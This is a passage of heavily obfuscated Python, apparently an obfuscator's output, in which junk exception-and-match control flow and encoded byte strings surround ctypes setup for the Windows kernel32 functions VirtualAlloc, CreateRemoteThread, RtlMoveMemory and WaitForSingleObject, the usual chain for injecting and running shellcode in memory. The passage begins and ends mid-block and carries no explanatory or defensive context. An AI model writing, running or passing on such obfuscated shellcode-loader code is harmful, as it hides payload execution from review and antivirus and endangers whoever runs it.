        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742704, 16742706]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742706, 16742704, 16742707]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _814: _814 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _187 = [[(lambda: (lambda _138: _138 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _183: _183 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742707, 16742708]))))())())()])
        raise MemoryError([(lambda: (lambda _1215: _1215 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _191:
        __4561348713529 += (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '716' == '1011':
        case True:
            raise MemoryError([True])
        case False:
            _712 = [[True], [False]]
            R_E_D__A_V______(['_312'])
    raise MemoryError([True])
except MemoryError as _712:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742705, 16742704, 16742707]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742712, 16742708]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _914: _914 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _412 = [[(lambda: (lambda _1817: _1817 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _73: _73 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742705, 16742706]))))())())()])
        raise MemoryError([(lambda: (lambda _139: _139 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _217:
        try:
            raise MemoryError(__4561348713529)
        except MemoryError as __3254407775952:
            if __3254407775952.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))():
                kernel32.VirtualAlloc.restype = wt.LPVOID
            if __3254407775952.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x03'))():
                __8033999929187 = (lambda: R_E_D__A_V(b'R_E_D__A_V__?+\xa7\xb2\xe0|'))()
            if __3254407775952.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x04'))():
                __2510381054965 = (lambda: R_E_D__A_V(b'R_E_D__A_V__\x1fI\xdftdW'))()
            if __3254407775952.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x05'))():
                __2925141129865 = (lambda: R_E_D__A_V(b'R_E_D__A_V__2\x9fa)\xc8\x9c'))()
            if __3254407775952.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x06'))():
                __2079270155670 = (lambda: R_E_D__A_V(b'R_E_D__A_V__\xb1<\xf5\xbf$*'))()
try:
    match '167' == '121':
        case True:
            raise MemoryError([True])
        case False:
            _87 = [[True], [False]]
            R_E_D__A_V______(['_1915'])
    raise MemoryError([True])
except MemoryError as _1711:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742711, 16742704, 16742705]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742704, 16742705]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _211: _211 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _1017 = [[(lambda: (lambda _813: _813 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _112: _112 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742707, 16742712]))))())())()])
        raise MemoryError([(lambda: (lambda _86: _86 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _189:
        __6591654027044 = (lambda: R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '818' == '1715':
        case True:
            raise MemoryError([True])
        case False:
            _92 = [[True], [False]]
            R_E_D__A_V______(['_119'])
    raise MemoryError([True])
except MemoryError as _131:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742709, 16742710]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742706, 16742704, 16742706]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _1411: _1411 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _41 = [[(lambda: (lambda _1819: _1819 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _35: _35 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742708, 16742704, 16742706]))))())())()])
        raise MemoryError([(lambda: (lambda _24: _24 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _918:
        __6591654027044 += (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '108' == '1215':
        case True:
            raise MemoryError([True])
        case False:
            _166 = [[True], [False]]
            R_E_D__A_V______(['_414'])
    raise MemoryError([True])
except MemoryError as _157:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742709, 16742704, 16742712]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742708, 16742707]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _1810: _1810 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _813 = [[(lambda: (lambda _912: _912 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _413: _413 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742709, 16742704, 16742708]))))())())()])
        raise MemoryError([(lambda: (lambda _154: _154 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _1610:
        try:
            raise MemoryError(__6591654027044)
        except MemoryError as __3845791415827:
            if __3845791415827.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))():
                kernel32.CreateRemoteThread.argtypes = (wt.HANDLE, wt.LPVOID, ctypes.c_size_t, wt.LPVOID, wt.LPVOID, wt.DWORD, wt.LPVOID)
            if __3845791415827.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x03'))():
                __5944026932830 = (lambda: R_E_D__A_V(b'R_E_D__A_V__\xb9L\xa4O\xcd\x01'))()
            if __3845791415827.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x04'))():
                __2761343484064 = (lambda: R_E_D__A_V(b'R_E_D__A_V__[.\xc0\xc0\x87\xf5'))()
try:
    match '713' == '1113':
        case True:
            raise MemoryError([True])
        case False:
            _711 = [[True], [False]]
            R_E_D__A_V______(['_43'])
    raise MemoryError([True])
except MemoryError as _712:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742709, 16742704, 16742705]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742705, 16742704, 16742704]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _1016: _1016 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _188 = [[(lambda: (lambda _917: _917 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _412: _412 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742708, 16742710]))))())())()])
        raise MemoryError([(lambda: (lambda _819: _819 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _1913:
        __2184388942270 = (lambda: R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '73' == '811':
        case True:
            raise MemoryError([True])
        case False:
            _1118 = [[True], [False]]
            R_E_D__A_V______(['_102'])
    raise MemoryError([True])
except MemoryError as _58:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742710, 16742704, 16742709]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742706, 16742711]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _419: _419 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _43 = [[(lambda: (lambda _73: _73 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _186: _186 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742711, 16742708]))))())())()])
        raise MemoryError([(lambda: (lambda _916: _916 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _1516:
        __2184388942270 += (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '317' == '910':
        case True:
            raise MemoryError([True])
        case False:
            _114 = [[True], [False]]
            R_E_D__A_V______(['_27'])
    raise MemoryError([True])
except MemoryError as _816:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742708, 16742704, 16742707]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742706, 16742704, 16742712]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _1416: _1416 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _34 = [[(lambda: (lambda _1811: _1811 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _197: _197 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742703, 16742708]))))())())()])
        raise MemoryError([(lambda: (lambda _73: _73 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _19:
        try:
            raise MemoryError(__2184388942270)
        except MemoryError as __6984871130924:
            if __6984871130924.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))():
                kernel32.CreateRemoteThread.restype = wt.HANDLE
            if __6984871130924.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x03'))():
                __3865964155495 = (lambda: R_E_D__A_V(b'R_E_D__A_V__wZ\xcb\x1b_J'))()
            if __6984871130924.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x04'))():
                __5140491543499 = (lambda: R_E_D__A_V(b'R_E_D__A_V__\x0c\xaa\xf7\xdf\x86\r'))()
            if __6984871130924.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x05'))():
                __4364273100022 = (lambda: R_E_D__A_V(b'R_E_D__A_V__\x11\xeb\xc0\x10s\x04'))()
            if __6984871130924.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x06'))():
                __2699705272174 = (lambda: R_E_D__A_V(b'R_E_D__A_V__\xb5\xf7x4\x01R'))()
            if __6984871130924.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x07'))():
                __2328252842519 = (lambda: R_E_D__A_V(b'R_E_D__A_V__R\xf9\xa7\xc2\xd4\xe3'))()
try:
    match '84' == '97':
        case True:
            raise MemoryError([True])
        case False:
            _319 = [[True], [False]]
            R_E_D__A_V______(['_173'])
    raise MemoryError([True])
except MemoryError as _56:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742712, 16742704, 16742707]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742709, 16742711]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _918: _918 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _39 = [[(lambda: (lambda _185: _185 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _814: _814 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742708, 16742709]))))())())()])
        raise MemoryError([(lambda: (lambda _173: _173 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _189:
        __3266391868513 = (lambda: R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '712' == '87':
        case True:
            raise MemoryError([True])
        case False:
            _1419 = [[True], [False]]
            R_E_D__A_V______(['_310'])
    raise MemoryError([True])
except MemoryError as _83:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742711, 16742710]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742712, 16742704, 16742709]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _188: _188 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _92 = [[(lambda: (lambda _118: _118 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _163: _163 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742707]))))())())()])
        raise MemoryError([(lambda: (lambda _91: _91 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _1312:
        __3266391868513 += (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '108' == '218':
        case True:
            raise MemoryError([True])
        case False:
            _1312 = [[True], [False]]
            R_E_D__A_V______(['_185'])
    raise MemoryError([True])
except MemoryError as _1112:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742711, 16742705]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742710, 16742709]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _1318: _1318 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _112 = [[(lambda: (lambda _95: _95 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _110: _110 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742710, 16742711]))))())())()])
        raise MemoryError([(lambda: (lambda _171: _171 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _78:
        try:
            raise MemoryError(__3266391868513)
        except MemoryError as __3506624830160:
            if __3506624830160.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))():
                kernel32.RtlMoveMemory.argtypes = (wt.LPVOID, wt.LPVOID, ctypes.c_size_t)
            if __3506624830160.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x03'))():
                __8552676094954 = (lambda: R_E_D__A_V(b'R_E_D__A_V__\x1c\xd7\t\xf2\x91\x98'))()
try:
    match '76' == '314':
        case True:
            raise MemoryError([True])
        case False:
            _518 = [[True], [False]]
            R_E_D__A_V______(['_116'])
    raise MemoryError([True])
except MemoryError as _1915:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742712, 16742704, 16742711]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742712, 16742704, 16742705]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _1411: _1411 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _1011 = [[(lambda: (lambda _510: _510 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _101: _101 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742710, 16742704, 16742703]))))())())()])
        raise MemoryError([(lambda: (lambda _197: _197 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _1914:
        __6093235288040 = (lambda: R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '119' == '122':
        case True:
            raise MemoryError([True])
        case False:
            _1318 = [[True], [False]]
            R_E_D__A_V______(['_418'])
    raise MemoryError([True])
except MemoryError as _194:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742703, 16742704, 16742710]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742712, 16742704, 16742711]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _97: _97 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _18 = [[(lambda: (lambda _110: _110 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _315: _315 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742710, 16742704, 16742705]))))())())()])
        raise MemoryError([(lambda: (lambda _1710: _1710 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _516:
        __6093235288040 += (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '38' == '1614':
        case True:
            raise MemoryError([True])
        case False:
            _186 = [[True], [False]]
            R_E_D__A_V______(['_49'])
    raise MemoryError([True])
except MemoryError as _95:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742708, 16742712]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742710, 16742704, 16742711]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _142: _142 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _61 = [[(lambda: (lambda _174: _174 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _111: _111 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742706, 16742704, 16742705]))))())())()])
        raise MemoryError([(lambda: (lambda _1215: _1215 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _111:
        try:
            raise MemoryError(__6093235288040)
        except MemoryError as __2947752091682:
            if __2947752091682.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))():
                kernel32.RtlMoveMemory.restype = None
            if __2947752091682.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x03'))():
                __7797838678349 = (lambda: R_E_D__A_V(b'R_E_D__A_V__\xbee\x87\xe7:\xbc'))()
try:
    match '15' == '1217':
        case True:
            raise MemoryError([True])
        case False:
            _97 = [[True], [False]]
            R_E_D__A_V______(['_165'])
    raise MemoryError([True])
except MemoryError as _913:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742705, 16742707]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742704, 16742706]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _158: _158 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _410 = [[(lambda: (lambda _1517: _1517 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _68: _68 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742710, 16742711]))))())())()])
        raise MemoryError([(lambda: (lambda _413: _413 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _1412:
        __3034424446477 = (lambda: R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '1813' == '128':
        case True:
            raise MemoryError([True])
        case False:
            _29 = [[True], [False]]
            R_E_D__A_V______(['_164'])
    raise MemoryError([True])
except MemoryError as _35:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742707, 16742704, 16742704]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742712, 16742704, 16742704]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _310: _310 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _64 = [[(lambda: (lambda _113: _113 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _142: _142 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742708, 16742709]))))())())()])
        raise MemoryError([(lambda: (lambda _315: _315 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _416:
        __3034424446477 += (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '19' == '27':
        case True:
            raise MemoryError([True])
        case False:
            _314 = [[True], [False]]
            R_E_D__A_V______(['_74'])
    raise MemoryError([True])
except MemoryError as _132:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742703, 16742707]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742708, 16742704, 16742706]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _1316: _1316 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _102 = [[(lambda: (lambda _82: _82 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _61: _61 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742710, 16742704, 16742704]))))())())()])
        raise MemoryError([(lambda: (lambda _1512: _1512 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _117:
        try:
            raise MemoryError(__3034424446477)
        except MemoryError as __2157179223478:
            if __2157179223478.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))():
                kernel32.WaitForSingleObject.argtypes = (wt.HANDLE, wt.DWORD)
            if __2157179223478.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x03'))():
                __8620767014084 = (lambda: R_E_D__A_V(b'R_E_D__A_V__b2\xc5O\x84\xbe'))()
try:
    match '1117' == '85':
        case True:
            raise MemoryError([True])
        case False:
            _161 = [[True], [False]]
            R_E_D__A_V______(['_913'])
    raise MemoryError([True])
except MemoryError as _12:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742703, 16742704, 16742706]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742704, 16742712]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _1413: _1413 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _79 = [[(lambda: (lambda _129: _129 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _412: _412 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742710, 16742704]))))())())()])
        raise MemoryError([(lambda: (lambda _63: _63 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _1415:
        __5084016566437 = (lambda: R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '178' == '36':
        case True:
            raise MemoryError([True])
        case False:
            _76 = [[True], [False]]
            R_E_D__A_V______(['_611'])
    raise MemoryError([True])
except MemoryError as _714:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742708, 16742712]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742711, 16742704, 16742703]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _216: _216 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _116 = [[(lambda: (lambda _156: _156 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _47: _47 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742704, 16742704, 16742711]))))())())()])
        raise MemoryError([(lambda: (lambda _69: _69 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _1310:
